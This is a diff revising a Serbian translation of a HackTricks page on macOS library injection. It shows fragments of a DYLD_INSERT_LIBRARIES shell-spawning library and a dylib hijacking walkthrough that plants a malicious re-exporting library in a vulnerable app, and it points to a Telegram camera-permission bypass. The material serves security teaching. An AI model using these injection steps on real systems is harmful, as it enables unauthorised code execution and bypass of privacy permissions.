@@ -6,17 +6,17 @@
 
 Drugi načini podrške HackTricks-u:
 
-* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
 * Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
-* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
+* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
 * **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
 
 ## DYLD\_INSERT\_LIBRARIES Osnovni primer
 
-**Biblioteka za ubacivanje** radi izvršavanja shell-a:
+**Biblioteka za ubacivanje** za izvršavanje shell-a:
 ```c
 // gcc -dynamiclib -o inject.dylib inject.c
 
@@ -45,16 +45,16 @@ printf("Hello, World!\n");
 return 0;
 }
 ```
-Ubacivanje:
+Umetanje:
 ```bash
 DYLD_INSERT_LIBRARIES=inject.dylib ./hello
 ```
-## Primer Dyld preuzimanja kontrole
+## Primer Dyld preusmeravanja
 
 Ciljani ranjivi binarni fajl je `/Applications/VulnDyld.app/Contents/Resources/lib/binary`.
 
 {% tabs %}
-{% tab title="entitlements" %}
+{% tab title="ovlašćenja" %}
 <pre class="language-bash" data-overflow="wrap"><code class="lang-bash">codesign -dv --entitlements :- "/Applications/VulnDyld.app/Contents/Resources/lib/binary"
 <strong>[...]com.apple.security.cs.disable-library-validation[...]
 </strong></code></pre>
@@ -87,12 +87,11 @@ current version 1.0.0
 compatibility version 1.0.0
 # Check the versions
 ```
-{% code %}
 {% endcode %}
 {% endtab %}
 {% endtabs %}
 
-Sa prethodnim informacijama znamo da **ne proverava potpis učitanih biblioteka** i pokušava da učita biblioteku sa:
+Sa prethodnim informacijama znamo da **ne proverava potpis učitanih biblioteka** i **pokušava da učita biblioteku iz**:
 
 * `/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib`
 * `/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib`
@@ -105,7 +104,7 @@ pwd
 find ./ -name lib.dylib
 ./Contents/Resources/lib2/lib.dylib
 ```
-Dakle, moguće je preuzeti kontrolu nad tim! Kreirajte biblioteku koja **izvršava proizvoljni kod i izvozi iste funkcionalnosti** kao i legitimna biblioteka ponovnim izvozom. I ne zaboravite da je kompajlirate sa očekivanim verzijama:
+Dakle, moguće je preuzeti kontrolu! Kreirajte biblioteku koja **izvršava proizvoljan kod i izvozi iste funkcionalnosti** kao legitimna biblioteka ponovnim izvozom. I zapamtite da je kompajlirate sa očekivanim verzijama:
 
 {% code title="lib.m" %}
 ```objectivec
@@ -127,7 +126,7 @@ gcc -dynamiclib -current_version 1.0 -compatibility_version 1.0 -framework Found
 ```
 {% endcode %}
 
-Putanja reizvoza koju je stvorila biblioteka je relativna u odnosu na učitavač, promenimo je u apsolutnu putanju do biblioteke za izvoz:
+Putanja reizvoza koju je kreirala biblioteka je relativna u odnosu na učitavač, promenimo je u apsolutnu putanju do biblioteke za izvoz:
 
 {% code overflow="wrap" %}
 ```bash
@@ -148,7 +147,7 @@ name /Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Con
 ```
 {% endcode %}
 
-Na kraju samo kopirajte ga na **preuzetu lokaciju**:
+Konačno samo kopirajte na **preuzetu lokaciju**:
 
 {% code overflow="wrap" %}
 ```bash
@@ -164,12 +163,12 @@ I **izvršite** binarnu datoteku i proverite da li je **biblioteka učitana**:
 </code></pre>
 
 {% hint style="info" %}
-Lepo objašnjenje o tome kako iskoristiti ovu ranjivost kako bi se zloupotrebila dozvola kamere u Telegramu može se naći na [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
+Lepo objašnjenje kako iskoristiti ovu ranjivost da bi se zloupotrebila dozvola kamere u Telegramu može se pronaći na [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
 {% endhint %}
 
 ## Veći obim
 
-Ako planirate da pokušate da ubacite biblioteke u neočekivane binarne datoteke, možete proveriti poruke događaja da biste saznali kada je biblioteka učitana unutar procesa (u ovom slučaju uklonite printf i izvršavanje `/bin/bash`).
+Ako planirate da pokušate da ubacite biblioteke u neočekivane binarne datoteke, možete proveriti poruke događaja da biste saznali kada je biblioteka učitana unutar procesa (u ovom slučaju uklonite printf i izvršenje `/bin/bash`).
 ```bash
 sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "[+] dylib"'
 ```
@@ -179,10 +178,10 @@ sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "[+] dylib"
 
 Drugi načini podrške HackTricks-u:
 
-* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
+* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJE**](https://github.com/sponsors/carlospolop)!
 * Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
-* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
+* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
 * **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
